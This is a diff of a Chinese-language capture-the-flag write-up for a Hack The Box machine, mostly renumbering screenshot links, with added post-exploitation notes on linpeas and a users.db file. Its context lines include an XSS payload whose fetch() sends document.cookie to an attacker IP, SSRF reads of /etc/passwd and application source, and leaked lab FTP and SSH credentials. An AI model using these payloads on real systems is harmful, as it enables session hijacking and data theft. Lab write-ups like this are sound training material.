@@ -1,5 +1,5 @@
 ---
-cover: ../../.gitbook/assets/image (4).png
+cover: ../../.gitbook/assets/image (9).png
 coverY: 0
 layout:
   cover:
@@ -23,7 +23,7 @@ layout:
 
 ### Nmap 端口探测
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
 获取开放端口 22/ssh 80/http.
 
@@ -33,7 +33,7 @@ layout:
 
 首先域名访问web服务,获取域名为 comprezzor.htb
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
 #### 子域名爆破
 
@@ -47,7 +47,7 @@ dnsmap comprezzor.htb -w /usr/share/wordlists/subdomains-1000.txt
 
 {% embed url="https://github.com/DictionaryHouse/Subdomain_List/blob/master/subdomains-1000.txt" %}
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
 共探测到三个子域名:
 
@@ -58,32 +58,32 @@ dnsmap comprezzor.htb -w /usr/share/wordlists/subdomains-1000.txt
 #### 目录扫描
 
 1. **comprezzor.htb**\
-   ![](<../../.gitbook/assets/image (8).png>)
+   ![](<../../.gitbook/assets/image (13).png>)
 2. **auth.comprezzor.htb**\
-   ![](<../../.gitbook/assets/image (9).png>)\
+   ![](<../../.gitbook/assets/image (14).png>)\
    \[17:54:00] 200 - 3KB - **/login**\
    \[17:54:01] 500 - 265B - **/logout**\
    \[17:54:21] 200 - 3KB - **/register**
 3. **report.comprezzor.htb**\
-   ![](<../../.gitbook/assets/image (10).png>)
+   ![](<../../.gitbook/assets/image (15).png>)
 4. **dashboard.comprezzor.htb**\
-   ![](<../../.gitbook/assets/image (11).png>)
+   ![](<../../.gitbook/assets/image (16).png>)
 
 ### 探索WEB服务可能的漏洞点
 
 #### comprezzor.htb 下的压缩服务可能存在xz后门
 
-<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
 
 最近大名鼎鼎的xz后门事件,但是据了解,这个后门没有披露具体用法,所以可以知道这应该是个兔子洞.
 
 #### report.comprezzor.htb/report\_bug 下的漏洞报告服务可能存在XSS漏洞
 
-<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
 
 #### auth.comprezzor.htb 登录与注册服务可能存在SQL注入
 
-<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
 
 尝试无果.
 
@@ -99,7 +99,7 @@ dnsmap comprezzor.htb -w /usr/share/wordlists/subdomains-1000.txt
 nc -lvvp 555
 ```
 
-<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
 payload:
 
@@ -107,7 +107,7 @@ payload:
 <img src=x onerror="fetch('http://10.10.14.xx:555/?cookie='+document.cookie);" >
 ```
 
-<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
 
 成功获得cookie!!!
 
@@ -115,23 +115,23 @@ payload:
 user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4
 ```
 
-<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
 
 浏览器中添加 cookie , 这里使用的插件是 modheader
 
-<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
 
 ### 利用 XSS 漏洞外带 admin 用户的 cookie
 
 拿到 cookie 我们能做什么 ? 当然是去 dashboard 一探究竟 !
 
-<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
 
 可以看到我们提交的漏洞报告, 检查了一遍, webdev没啥用.
 
 尝试把权重提高, 看能不能提交给上层更高权限的用户. 记得开nc的监听.
 
-<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
 
 等一等,如果没收到就重启一下机子.
 
@@ -142,17 +142,17 @@ user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifX
 
 更换这个cookie,再次访问dashboard, 就多出来了好多功能.
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 ### Create PDF Report 存在本地/远程文件包含等漏洞&#x20;
 
 这个页面大概率是漏洞点, 但是存在黑名单或者白名单的规则限制 ,尝试下只能访问http协议.
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 使用nc监听, 看看能收集到什么信息.
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
 可以看到发来的包, 用的是Python-urllib/3.11, 大概率可以确定该服务是 flask.
 
@@ -168,11 +168,11 @@ Google一下这个包,发现存在解析漏洞.
  file:///etc/passwd
 ```
 
-<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
 
 然后挺奇怪的,真正的用户只有一个 root ,这个时候其实怀疑这个是在容器内, 访问根目录下的.dockerenv, 确实能够成功下载,可以证明确实是在 docekr 容器内.
 
-<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
 
 在容器内,能够获取的有效的信息就比较有限, 特别实在这种盲盒的形式下, 现在就把希望放在了源代码上了.
 
@@ -186,7 +186,7 @@ Google一下这个包,发现存在解析漏洞.
  file:///proc/self/cmdline
 ```
 
-<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
 
 可以知道启动web项目时,使用的指令为
 
@@ -202,7 +202,7 @@ python3 /app/code/app.y
  file:///app/code/app.py
 ```
 
-<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
 
 整理后的代码:
 
@@ -543,17 +543,17 @@ passwd: u3jai8y71s2
  ftp://ftp_admin:u3jai8y71s2@ftp.local/
 ```
 
-<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
 
 可以看到, 有私钥!!! 但是还不知道username!! 利用同样的方式,把私钥和welcome\_note.txt都down下来看看.
 
-<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption><p>私钥</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption><p>私钥</p></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
 
 这里可以看到,他还把私钥加密了, passphrase 为 Y27SH19HDIWD , 可以用 ssh-add 加入key, 获取用户名.
 
-<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
 
 得到用户名为 dev\_acc.
 
@@ -563,5 +563,50 @@ passwd: u3jai8y71s2
 ssh dev_acc@10.10.11.15 -i id_rsa
 ```
 
-<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
 
+## 后渗透信息收集
+
+### Linpeas 获取信息
+
+二话不说, 先上 linpeas .
+
+{% embed url="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS" %}
+
+把比较有用的信息截了个图.
+
+**user 用户:**
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+除了登录的用户, 还有几个用户.
+
+**用户组:**
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+用户组中也有些有意思的, adam 和 lopez 用户都在 sys-adm 用户组中, 大概率权限比较高.
+
+**/opt 目录下:**
+
+![](<../../.gitbook/assets/image (2).png>)
+
+有些东西, 其中有的是sys-adm组的权限
+
+**.db 文件**
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+user.db 是 web 服务用的, 在前面的代码里也有出现, 值得关注.
+
+### 查看 usesr.db 破解获得 adam 密码
+
+到 /var/www/app/blueprints/auth/, 使用 sqlite3 读取数据库.
+
+```bash
+sqlite3 users.db
+```
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+破解电脑现在不太行, 有点跑不动😭
